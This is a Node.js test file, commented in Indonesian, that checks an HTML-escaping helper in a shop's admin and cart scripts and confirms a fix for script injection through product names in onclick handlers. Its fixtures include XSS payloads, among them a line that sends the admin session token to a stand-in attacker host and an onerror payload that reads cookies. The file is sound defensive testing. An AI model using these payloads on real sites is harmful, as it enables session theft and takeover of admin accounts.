import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import path from 'node:path';

// esc() escapa HTML dipakai di 3 file front-end (admin.js, cart.js, toko/index.html)
// untuk menaruh data (nama produk/layanan admin, data pesanan pelanggan) ke dalam
// markup lewat innerHTML. Di admin.js, esc() JUGA dipakai untuk menaruh nama
// produk/layanan ke dalam STRING JS BERKUTIP-TUNGGAL di atribut onclick:
//   onclick="delProduct('${p.id}','${esc(p.name)}')"
// Sebelum perbaikan ini, esc() cuma escape & < > " — TIDAK escape kutip tunggal.
// Nama produk/layanan yang mengandung kutip tunggal (mis. hasil import CSV daftar
// harga dari vendor POS, atau kolaborator admin lain) bisa memutus string JS itu
// dan menyuntik JS bebas yang jalan di sesi admin yang sedang login — termasuk
// mencuri token admin dari sessionStorage('rrhc_admin') untuk akses penuh API admin.
// Tes ini memuat SUMBER ASLI tiap file (bukan salinan tertulis ulang) supaya
// menguji kode yang benar-benar dikirim ke browser, bukan tebakan.

const root = path.dirname(path.dirname(fileURLToPath(import.meta.url)));

function loadEscFromArrowLine(file, needle) {
  const src = readFileSync(path.join(root, file), 'utf8');
  const line = src.split('\n').find(l => l.includes(needle));
  assert.ok(line, `baris "${needle}" tidak ditemukan di ${file}`);
  const expr = line.trim().replace(/^const esc = /, '').replace(/;$/, '');
  return new Function('return (' + expr + ')')();
}

function loadEscFromFunctionLine(file, needle) {
  const src = readFileSync(path.join(root, file), 'utf8');
  const line = src.split('\n').find(l => l.includes(needle));
  assert.ok(line, `baris "${needle}" tidak ditemukan di ${file}`);
  return new Function('return (' + line.trim().replace(/^function /, 'function ') + ')')();
}

const targets = [
  ['public/js/admin.js', () => loadEscFromArrowLine('public/js/admin.js', 'const esc = s =>')],
  ['public/js/cart.js', () => loadEscFromFunctionLine('public/js/cart.js', 'function esc(s)')],
  ['public/toko/index.html', () => loadEscFromFunctionLine('public/toko/index.html', 'function esc(s)')],
];

for (const [file, load] of targets) {
  test(`${file}: esc() meng-escape kelima karakter HTML/JS-string berbahaya`, () => {
    const esc = load();
    assert.equal(esc(`&<>"'`), '&amp;&lt;&gt;&quot;&#39;');
  });

  test(`${file}: esc() tidak mengubah teks biasa`, () => {
    const esc = load();
    assert.equal(esc('Serum Rambut 100ml'), 'Serum Rambut 100ml');
  });

  test(`${file}: esc() tidak throw untuk null/undefined`, () => {
    const esc = load();
    assert.doesNotThrow(() => esc(null));
    assert.doesNotThrow(() => esc(undefined));
  });
}

test('admin.js: nama produk berkutip-tunggal tidak lagi memutus onclick="delProduct(\'id\',\'nama\')"', () => {
  const esc = loadEscFromArrowLine('public/js/admin.js', 'const esc = s =>');
  const payload = `x'); alert(document.title); //`;
  const onclick = `delProduct('p1','${esc(payload)}')`;
  // KONFIRMASI BUG (sebelum perbaikan): esc lama membiarkan kutip tunggal mentah
  // lolos, jadi string di atas mengandung urutan `');` yang menutup argumen JS
  // lebih awal dan menjalankan `alert(...)` sebagai statement terpisah.
  assert.ok(!onclick.includes("x');"),
    'kutip tunggal mentah lolos — payload bisa memutus string JS di onclick');
  assert.ok(onclick.includes('&#39;'), 'kutip tunggal harus di-escape jadi &#39;');
});

test('admin.js: nama layanan berkutip-tunggal tidak lagi memutus onclick="delPrice(\'id\',\'nama\')"', () => {
  const esc = loadEscFromArrowLine('public/js/admin.js', 'const esc = s =>');
  const payload = `Creambath'); fetch('https://evil.example/steal?t='+sessionStorage.getItem('rrhc_admin')); //`;
  const onclick = `delPrice('h1','${esc(payload)}')`;
  // Hasil escape sama sekali tidak boleh mengandung kutip tunggal mentah di
  // tengah nilai (hanya dua kutip pembatas argumen asli yang tersisa).
  const encodedName = onclick.slice("delPrice('h1','".length, -"')".length);
  assert.ok(!encodedName.includes("'"), 'tidak boleh ada kutip tunggal mentah di dalam nilai ter-escape');
});

// Tes di atas hanya menguji esc() dalam string yang dibangun ulang secara manual,
// bukan baris rendering ASLI di admin.js. Itu menyamarkan cacat yang lebih dalam:
// atribut HTML seperti onclick="...'${esc(name)}'..." di-DECODE oleh parser HTML
// (mengubah &#39; balik jadi ') SEBELUM isinya diparse sebagai JS oleh browser.
// Jadi meng-escape kutip tunggal saja TIDAK cukup untuk konteks
// JS-string-di-dalam-atribut-HTML — nama produk/layanan berisi `x'); alert(1); //`
// tetap bisa menyuntik JS lewat tombol Hapus walau esc() sudah meng-escape kutip.
// Perbaikan sesungguhnya: jangan pernah sisipkan data ke dalam teks onclick sama
// sekali — taruh di atribut data-* (konteks HTML biasa, esc() sudah tepat untuk
// itu) dan baca lewat this.dataset di dalam handler statis tanpa interpolasi.
test('admin.js: tombol Hapus produk/layanan pakai data-* attribute, bukan sisipan ke string JS onclick', () => {
  const src = readFileSync(path.join(root, 'public/js/admin.js'), 'utf8');
  assert.ok(
    src.includes(`onclick="delProduct(this.dataset.id,this.dataset.name)"`),
    'tombol hapus produk harus memanggil delProduct lewat this.dataset, tanpa menyisipkan id/nama ke teks onclick'
  );
  assert.ok(
    src.includes(`onclick="delPrice(this.dataset.id,this.dataset.name)"`),
    'tombol hapus layanan harus memanggil delPrice lewat this.dataset, tanpa menyisipkan id/nama ke teks onclick'
  );
  // Pola lama (rentan) sungguh-sungguh tidak boleh ada lagi di source.
  assert.ok(!src.includes(`onclick="delProduct('\${p.id}','\${esc(p.name)}')"`),
    'pola onclick lama yang menyisipkan nama ke string JS masih ada di admin.js');
  assert.ok(!src.includes(`onclick="delPrice('\${h.id}','\${esc(h.name)}')"`),
    'pola onclick lama yang menyisipkan nama ke string JS masih ada di admin.js');
});

test('admin.js: nama produk/layanan apa pun di data-name tidak bisa memutus atribut HTML atau tereksekusi sebagai JS', () => {
  const esc = loadEscFromArrowLine('public/js/admin.js', 'const esc = s =>');
  const payload = `x"><img src=1 onerror=alert(document.cookie)>`;
  const escaped = esc(payload);
  // Hasil escape tidak boleh mengandung kutip ganda mentah — itu satu-satunya
  // karakter yang bisa memutus atribut data-name="..." (dibatasi kutip ganda).
  assert.ok(!escaped.includes('"'), 'kutip ganda mentah lolos — bisa memutus atribut data-name="..."');
  assert.ok(!escaped.includes('<') && !escaped.includes('>'),
    'tag mentah lolos — bisa menyisipkan elemen baru ke markup tabel admin');
  // Karena onclick sekarang string statis (bukan hasil interpolasi), payload apa
  // pun di data-name tidak pernah diparse sebagai kode JS — hanya diteruskan
  // sebagai argumen fungsi lewat this.dataset.name saat tombol diklik.
});
